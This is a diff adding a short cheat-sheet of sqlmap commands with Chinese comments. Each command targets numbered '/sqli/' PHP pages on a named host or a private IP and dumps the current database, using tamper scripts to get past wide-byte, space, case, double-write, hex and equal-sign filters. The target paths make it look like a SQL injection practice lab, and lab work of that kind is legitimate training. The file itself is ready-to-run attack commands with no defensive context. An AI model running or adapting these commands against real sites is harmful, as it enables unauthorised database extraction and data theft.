@@ -1,0 +1,9 @@
+python .\sqlmap.py -u "http://www.bdrwmy.cn:8001/sqli/03.php?id=1"  --current-db --dump --batch 一把嗦
+python .\sqlmap.py -u "http://www.bdrwmy.cn:8001/sqli/02.php?id=1" --current-db --dump --batch   --tamper unmagicquotes 宽字节过滤一把嗦
+python .\sqlmap.py -u "http://www.bdrwmy.cn:8001/sqli/07.php?id=1"  --current-db --dump --batch --tamper "space2comment.py" 空格过滤一把嗦
+python .\sqlmap.py -u "http://www.bdrwmy.cn:8001/sqli/07.php?id=1"  --current-db --dump --batch --tamper "space2comment.py" 大小写过滤一把嗦
+python .\sqlmap.py -u "http://10.30.19.132/sqli/09.php?id=1"  --current-db --dump --batch --tamper "doublewords.py" 双写绕过一把嗦
+python .\sqlmap.py -u "http://www.bdrwmy.cn:8001/sqli/11.php?id=1"  --current-db --dump --batch --tamper=hex2char 16进制一把嗦
+python .\sqlmap.py -u "http://www.bdrwmy.cn:8001/sqli/12.php?id=1"  --current-db --dump --batch --tamper=equaltolike 等价函数过滤一把嗦
+环境python 2.6.x or 2.7.x
+
